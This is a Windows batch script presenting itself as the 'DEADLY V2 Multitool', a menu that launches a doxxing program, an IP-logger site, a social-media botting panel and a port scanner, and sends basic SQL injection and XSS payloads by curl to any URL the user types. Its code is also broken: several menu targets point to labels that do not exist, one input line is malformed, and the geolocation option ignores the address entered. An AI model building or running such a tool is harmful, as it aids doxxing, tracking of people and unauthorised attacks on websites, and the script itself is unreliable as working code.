@echo off
chcp 65001
title DEADLY V2 Multitool
color 4

:menu
cls
echo Welcome to the DEADLY V2 Multitool!
echo 1. Open PuTTY
echo 2. Ping IP Address
echo 3. Port Scan
echo 4. Geolocation
echo 5. Bottingpanel
echo 6. Dox_Tool_V2
echo 7. iplogger
echo 8. instagramid
echo 9. pinger
echo 10. SQL injection
echo 11. XSS
echo 12. Whois Lookup
echo 13. DNS Lookup
echo 14. HTTP Headers
echo 15. exit
set /p choice=Enter your choice: 

if "%choice%"=="1" goto open_putty
if "%choice%"=="2" goto ping_ip
if "%choice%"=="3" goto portscanner
if "%choice%"=="4" goto geo_location
if "%choice%"=="5" goto bottingpanel
if "%choice%"=="6" goto Dox_Tool_V2
if "%choice%"=="7" goto iplogger
if "%choice%"=="8" goto instagramid
if "%choice%"=="9" goto pinger
if "%choice%"=="10" goto SQL injection
if "%choice%"=="11" goto XSS
if "%choice%"=="12" goto Whois Lookup
if "%choice%"=="13" goto DNS
if "%choice%"=="14" goto HTTP Headers
if "%choice%"=="15" goto exit
goto invalid_choice

:open_putty
@echo off & cls
start putty.exe
pause
goto menu

:ping_ip
@echo off & cls
set /p ip=Enter the IP address to ping: 
ping %ip%
pause
goto menu

:portscanner
@echo off & cls
start %cd%\PROGRAMS\pScan.exe
goto menu

:geo_location
@echo off & cls
set /p ip=Enter the IP address for geolocation: 
curl https://whatsmyipaddress.com/
pause
goto menu

:bottingpanel
@echo off & cls
explorer "https://legendsmm.lol/"
goto menu

:doxtool
@echo off & cls
start %cd%\PROGRAMS\Dox_Tool_V2.exe
goto menu

:iplogger
@echo off & cls
explorer "https://iplogger.org/"
goto menu

:instagramid
@echo off & cls
explorer "https://commentpicker.com/nl/instagram-gebruikers-id.php"
goto menu

:pinger
@echo off & cls
start %cd%\PROGRAMS\Pinger.bat
goto menu

:SQL injection
@echo off & cls
set /p url="URL: "
echo Enter the URL you want to test for SQL injection:
 set /p url="URL: " set injection="' OR 1=1 --"
curl -X POST %url% --data-urlencode "userinput=%injection%"
pause
goto menu
   
:XSS
@echo off & cls
echo Enter the URL you want to test for XSS:
set /p url="URL: "
 set injection="<script>alert('XSS')</script>"
 curl -X POST %url% --data-urlencode "userinput=%injection%"
 pause
 goto menu 
 
:WhoisLookup
@echo off & cls
echo Enter the domain you want to lookup:
set /p domain="Domain: "
whois %domain%
pause
goto menu

:DNS
@echo off & cls
echo Enter the domain you want to lookup:
set /p domain="Domain: "
nslookup %domain%
pause
goto menu


:HTTPSHEADERS
@echo off & cls
echo Enter the URL you want to lookup:
set /p url="URL: "
curl -I %url%
pause
goto menu
 

:invalid_choice
echo Invalid choice. Please choose a valid option.
pause
goto menu
